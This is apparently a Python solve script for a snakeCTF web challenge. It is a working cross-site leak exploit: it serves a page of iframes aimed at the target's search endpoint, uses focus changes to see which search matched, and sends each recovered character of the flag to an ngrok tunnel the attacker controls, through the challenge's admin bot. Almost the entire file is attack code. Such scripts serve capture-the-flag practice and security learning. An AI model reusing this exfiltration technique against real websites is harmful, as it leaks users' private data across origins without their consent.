#!/usr/bin/env python3

import threading
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
from pyngrok import ngrok
import requests
from urllib.parse import unquote
import sys
import string
import urllib3

urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) < 3:
    print(
        f"Usage: {sys.argv[0]} https://url.for.challenge.tld https://url.for.bot.tld")
    exit(1)

CHALL_URL = sys.argv[1]
BOT_URL = sys.argv[2]
PORT = 12345

tunnel = ngrok.connect(PORT, "http")
NGROK_URL = tunnel.public_url
print(f"Tunnel open @ {NGROK_URL}")

result = "snakeCTF{"
# Split characters to reduce the number of requests
chars = {
    "other": string.digits + "_}",
    "bigalfa1": string.ascii_uppercase[:13],
    "bigalfa2": string.ascii_uppercase[13:],
    "smallalfa1": string.ascii_lowercase[:13],
    "smallalfa2": string.ascii_lowercase[13:],
}
# Current testing charset
selected_chars = "bigalfa"


# HTTP Server to serve the payload and read the result
class HTTPHandler(SimpleHTTPRequestHandler):
    # Disable logging
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        global result
        if self.path == "/":
            # Send Payload
            self.send_response(200)
            self.end_headers()
            self.wfile.write(
                """<html><body><script>let iframe;let found = false;""".encode())
            # Try all characters with iframes
            for current in chars[selected_chars]:
                self.wfile.write(
                    f"""
                    iframe = document.createElement('iframe');
                    iframe.src = '{CHALL_URL}/search?filter={result + current}#film-0';
                    document.body.appendChild(iframe);""".encode()
                )

            # When focus changes, perform a redirect to the server
            self.wfile.write(
                f"""setInterval(() => {{
                   if (document.activeElement != document.body && !found) {{
                       const u = new URL(window.document.activeElement.src);
                       document.location = '{NGROK_URL}/' + \
                           u.searchParams.get('filter');
                        found = true;
                   }}
               }}, 20)""".encode()
            )
            self.wfile.write("""</script></body></html>""".encode())

        elif self.path == "/favicon.ico":
            # Ignore favico
            self.send_response_only(404)
        else:
            # Read where the focus changed
            result = unquote(self.path[1:])
            print("Got ", result)
            self.send_response(200)
            self.end_headers()


def run_query():
    pre = result
    res = requests.post(
        f"{BOT_URL}/url", data={"url": NGROK_URL}, verify=False)
    if res.status_code != 200:
        print("Error contacting the bot", file=sys.stderr)
        return False
    if pre != result:
        return True


# Start HTTP server
httpd = ThreadingHTTPServer(("localhost", PORT), HTTPHandler)
server = threading.Thread(target=httpd.serve_forever)
server.daemon = True
server.start()
print("Local server started")

print("Sending request to bot")
while result[-1] != "}":
    print(result)
    for charset in chars.keys():
        print(f"Trying {charset}")
        selected_chars = charset
        found = run_query()
        if found:
            break

print("FLAG:", result)
httpd.shutdown()
ngrok.disconnect(tunnel.public_url)
